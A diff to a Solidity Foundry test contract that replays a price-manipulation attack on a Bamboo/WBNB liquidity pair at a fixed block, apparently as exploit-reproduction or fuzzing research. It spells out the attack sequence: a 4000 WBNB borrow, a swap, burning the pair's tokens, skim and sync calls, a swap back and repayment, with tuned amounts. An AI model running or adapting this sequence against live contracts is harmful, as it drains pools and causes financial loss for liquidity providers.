@@ -194,6 +194,9 @@ contract BambooTestBase is Test, BlockLoader {
         bamboo.transfer(address(pair), amount);
         pair.skim(attacker);
         pair.sync();
+        bamboo.transfer(address(pair), amount);
+        pair.skim(attacker);
+        pair.sync();
     }
 
     function test_gt() public {
@@ -203,23 +206,19 @@ contract BambooTestBase is Test, BlockLoader {
         borrow_wbnb_owner(4000 ether);
         printBalance("After step0 ");
         swap_pair_attacker_wbnb_bamboo(
-            134890849999929463804,
-            pair.getAmountOut(134890849999929463804, address(wbnb))
+            155890849999929463804,
+            pair.getAmountOut(155890849999929463804, address(wbnb))
         );
         printBalance("After step1 ");
-        burn_bamboo_pair(20533870967101818317);
+        burn_bamboo_pair(54033870967101818317);
         printBalance("After step2 ");
-        burn_bamboo_pair(20533870967101818317);
-        printBalance("After step3 ");
-        burn_bamboo_pair(20533870967101818317);
-        printBalance("After step4 ");
         swap_pair_attacker_bamboo_wbnb(
             bamboo.balanceOf(attacker),
             pair.getAmountOut(bamboo.balanceOf(attacker), address(bamboo))
         );
-        printBalance("After step5 ");
+        printBalance("After step3 ");
         payback_wbnb_owner(4000 ether);
-        printBalance("After step6 ");
+        printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
@@ -231,21 +230,17 @@ contract BambooTestBase is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4,
         uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
+        uint256 amt6
     ) public {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(29668034);
-        vm.assume(amt8 >= amt0);
+        vm.assume(amt6 >= amt0);
         borrow_wbnb_owner(amt0);
         swap_pair_attacker_wbnb_bamboo(amt1, amt2);
         burn_bamboo_pair(amt3);
-        burn_bamboo_pair(amt4);
-        burn_bamboo_pair(amt5);
-        swap_pair_attacker_bamboo_wbnb(amt6, amt7);
-        payback_wbnb_owner(amt8);
+        swap_pair_attacker_bamboo_wbnb(amt4, amt5);
+        payback_wbnb_owner(amt6);
         assert(!attackGoal());
         vm.stopPrank();
     }
